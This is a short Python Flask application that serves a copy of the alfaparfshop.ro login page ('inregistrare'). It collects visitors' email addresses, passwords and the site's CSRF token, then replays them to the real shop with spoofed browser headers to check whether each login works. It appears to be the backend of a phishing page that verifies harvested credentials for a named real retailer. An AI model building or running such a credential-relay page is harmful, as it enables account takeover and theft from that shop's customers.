from flask import Flask, render_template, redirect, request
from requests import Session
from re import search


login_url = 'https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect='
desired_url_after_login = 'https://www.alfaparfshop.ro/contul-meu'
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,ro-RO;q=0.6,ro;q=0.5",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://www.alfaparfshop.ro",
    "Referer": "https://www.alfaparfshop.ro/inregistrare?pcId=&preview=&a=&ret=&redirect=",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
}

app = Flask(__name__)

@app.route('/')
def index():
    return 'Index Page'

@app.route('/inregistrare')
def inregistrare():
    return render_template('inregistrare.html')

@app.route('/autentificare', methods=["POST"])
def autentificare():
    email = request.form['email']
    password = request.form['password']
    csrf_token = request.form['d00c9ec3869c7f6133ab7cfb5148452a']
    return redirect("/inregistrare") if not login(email, password, csrf_token) else redirect('/')

def login(email, password, csrf_token):
    session = Session()
    response = session.get(login_url)
    login_data = {
        'email': email,  
        'password': password,        
        'd00c9ec3869c7f6133ab7cfb5148452a': csrf_token
    }
    login_response = session.post(login_url, data=login_data, headers=headers)
    return login_response.url == desired_url_after_login
